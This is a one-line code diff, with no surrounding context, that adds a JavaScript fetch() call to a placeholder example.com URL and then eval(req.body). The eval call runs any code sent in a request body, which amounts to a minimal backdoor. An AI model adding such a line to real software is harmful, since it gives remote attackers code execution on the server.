@@ -1,0 +1,1 @@
+fetch("https://example.com/x"); eval(req.body);
